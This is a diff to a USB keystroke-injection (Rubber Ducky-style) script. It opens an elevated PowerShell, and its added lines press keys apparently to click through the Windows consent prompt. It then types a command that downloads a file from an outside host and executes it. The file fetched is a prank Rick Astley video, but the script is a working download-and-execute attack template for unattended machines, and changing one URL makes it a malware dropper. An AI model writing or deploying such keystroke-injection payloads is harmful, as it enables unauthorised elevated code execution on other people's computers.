@@ -15,7 +15,12 @@ REM my best attempt at a elevated powershell instance
 STRING powershell Start-Process powershell -Verb runAs
 ENTER
 DELAY 3000
+TAB
+TAB
+SPACE
+DELAY 500
 ALT y
 DELAY 3000
 STRING $down = New-Object System.Net.Webclient; $url = 'https://ia801509.us.archive.org/10/items/Rick_Astley_Never_Gonna_Give_You_Up/Rick_Astley_Never_Gonna_Give_You_Up.mp4'; $file = 'rick.mp4'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
+SPACE
 ENTER	
